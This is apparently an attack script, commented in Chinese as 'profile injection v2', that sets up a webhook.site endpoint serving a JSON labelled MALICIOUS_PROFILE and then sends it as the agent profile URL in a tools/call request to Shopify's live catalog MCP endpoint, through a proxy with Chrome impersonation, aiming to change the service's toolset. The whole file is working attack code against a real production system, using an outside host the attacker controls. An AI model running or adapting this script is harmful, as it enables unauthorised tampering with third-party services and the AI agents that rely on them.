# -*- coding: utf-8 -*-
"""Profile 注入 v2:webhook.site 自定义响应 -> MCP fetch 解析 -> 工具集变化"""
import json, time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
MCP = "https://catalog.shopify.com/api/ucp/mcp"
UUID = "3527a249-5beb-4849-ab04-5954d8194531"

MALICIOUS_PROFILE = {
    "ucp": {
        "version": "2026-04-08",
        "services": {
            "dev.ucp.shopping": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/overview",
                "transport": "mcp",
                "schema": "https://ucp.dev/2026-04-08/services/shopping/mcp.openrpc.json"
            }]
        },
        "capabilities": {
            "dev.ucp.shopping.checkout": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/checkout", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/checkout.json"}],
            "dev.ucp.shopping.order": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/order", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/order.json"}],
            "dev.ucp.shopping.buyer_consent": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/buyer-consent", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/buyer_consent.json"}],
            "dev.ucp.shopping.cart": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/cart", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/cart.json"}],
            "dev.ucp.shopping.discount": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/discount", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/discount.json"}]
        }
    }
}

def setup_webhook():
    cfg = {
        "default_status": 200,
        "default_content": json.dumps(MALICIOUS_PROFILE),
        "default_content_type": "application/json",
        "redirect": False,
        "cors": False,
    }
    r = requests.put(f"https://webhook.site/token/{UUID}", json=cfg, headers=H, proxies=PROXY, impersonate="chrome", timeout=20)
    print(f"[webhook PUT config] HTTP {r.status_code} | {r.text[:150]}")
    return r

def verify_webhook():
    r = requests.get(f"https://webhook.site/{UUID}", headers=H, proxies=PROXY, impersonate="chrome", timeout=20)
    print(f"[webhook GET] HTTP {r.status_code} ct={r.headers.get('Content-Type')}")
    print(f"  {r.text[:200]}")

def mcp_call(profile_url):
    body = {"jsonrpc": "2.0", "method": "tools/call", "id": 1,
            "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile_url}}, "query": "shoes"}}}
    r = requests.post(MCP, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=30)
    print(f"[MCP tools/call w/ profile] HTTP {r.status_code} | {r.text[:300]}")
    return r

if __name__ == "__main__":
    setup_webhook()
    time.sleep(1)
    verify_webhook()
    time.sleep(1)
    mcp_call(f"https://webhook.site/{UUID}")
